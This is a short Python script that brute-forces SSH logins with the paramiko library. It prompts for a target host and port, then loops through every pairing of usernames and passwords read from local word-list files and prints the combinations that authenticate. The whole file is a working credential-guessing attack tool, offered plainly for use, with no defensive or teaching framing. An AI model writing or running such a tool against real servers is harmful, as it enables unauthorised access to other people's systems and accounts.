import paramiko
import socket
import time

def brute_force_ssh(hostname, port,user, pss):
  log = paramiko.util.log_to_file('log.log')
  ssh_client = paramiko.SSHClient()
  ssh_client.load_system_host_keys()
  ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    print(f'Testing credentials {user}:{pss}')
    ssh_client.connect(hostname,port=port,username=user, password=pss, timeout=5)
    print(f'credentials ok {user}:{pss}')
  except paramiko.AuthenticationException as e:
    print('AutehticationException: ', e)
  except socket.error as e:
    print('SocketError: ', e)

  
def main():
  host = input('Enter the target hostname: ')
  port = input('Enter the target port: ')
  users = open('users.txt', 'r')
  users = users.readlines()
  pss = open('passwords.txt', 'r').readlines()
  for user in users:
    for psswd in pss:
      time.sleep(3)
      brute_force_ssh(host, port, user.rstrip(), psswd.rstrip())

if __name__ == '__main__':
  main()
  